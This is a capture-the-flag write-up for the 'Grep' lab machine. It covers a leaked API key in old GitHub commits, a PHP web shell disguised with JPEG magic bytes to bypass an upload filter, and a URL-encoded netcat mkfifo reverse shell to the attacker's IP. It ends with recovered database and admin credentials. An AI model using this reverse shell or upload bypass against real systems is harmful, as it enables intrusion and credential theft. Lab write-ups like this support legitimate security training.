Grep

Target IP: 10.10.82.235

Challenge Description:

Reconnaissance


There are four TCP ports open on the target machine, as shown above.


Doing an aggressive port scan against the four open ports returns the result above. I added grep.thm in my hosts file too.


I tried to browse to the application on port 51337 and it presented me the information above in the certificate. There is another VHOST name called leakchecker.grep.thm. I added this host to my /etc/hosts file.


Now my /etc/hosts file contains the two VHOST names as shown above.

OSINT, Exploitation, and Flags

Port 80: HTTP

The webpage above is displayed for this web application on this port.


I tried to create an account, but it did not let me as the message above was shown.


Using BurpSuite, I intercepted the POST request. This request has an interesting header field called X-Thm-Api-Key as shown above. But this API is invalid as I obtained the message Invalid Or Expired API key. This MD5 API key e8d25b4208b80008a9e15c8698640e85 decodes to johncena. I need to obtain the correct API key.



After doing some search for searchME! on Github, I obtained the interesting Github account above. From previous enumeration, I know the web application is under development and this Github project is under development too. This project contains four commits. Maybe the older commits contain sensitive data?


And bingo! The older register.php file contains the API key of ffe60ecaa8bba2f12b43d1a4b15b8f39, as shown above. If this API key works, I can now create accounts with it.


I successfully created an account with the credentials test:123, as shown above. This is done by using the old API key ffe60ecaa8bba2f12b43d1a4b15b8f39.


I logged in with the new credentials at https://grep.thm and obtained the first flag, as shown above. I tried to find the email address of the admin user, but I had no luck. From previous enumeration, I know there is another PHP file called upload.php. Maybe I can access it?


Browsing to https://grep.thm/public/html/upload.php works as the upload.php is displayed as shown above.


The latest Github commit contains the changes above. It looks like the developer added magic bytes checking. If the upload is successful, the image is moved to uploads/ directory as shown above. Maybe I can perform a file upload attack?


I created a simple PHP web shell called shell.jpg.php, as shown above. It contains four a characters at the start. This will be replaced by the magic bytes; otherwise, the file format will be invalid and the web shell will not be executable.


Using hexeditor, I added the magicbytes FFD8FFE0 of the JPG file at the start of the PHP webshell as shown above.


Now the PHP web shell is ready to go as the file is being detected as JPEG as shown above.


Then I successfully uploaded this malicious PHP webshell by bypassing the filters in place.


And I can issue commands using this PHP webshell as shown above. Time to elevate this to a reverse shell connection now.


I started a listener on port 8443. And I deployed the URL-encoded nc reverse shell script rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%2010.14.55.153%208443%20%3E%2Ftmp%2Ff using the simple webshell. Then I obtained a reverse shell connection on my machine at port 8443, as shown above. Now I have a foothold on the target machine with the session as www-data.


I obtained the credentials of the MySQL application root:password at /var/www/html/api/config.php, but this user www-data does not have the permission to run the binary. After some manual enumeration, I found a directory called backup at /var/www. This directory contains a file called users.sql. Maybe this SQL database contains useful information?


And bingo! I obtained the credentials of the user admin from the users table. The admin's email is admin@searchme2023cms.grep.thm. The encrypted password $2y$10$3V62f66VxzdTzqXF4WHJI.Mpgcaj3WxwYsh7YDPyv1xIPss4qCT9C of user admin is also shown above.


From previous enumeration, I found another web application called Email Leak Checker on the target machine. I managed to use this web application to obtain the password admin_tryhackme! of the user admin. This challenge was a lot of fun as it required OSINT!
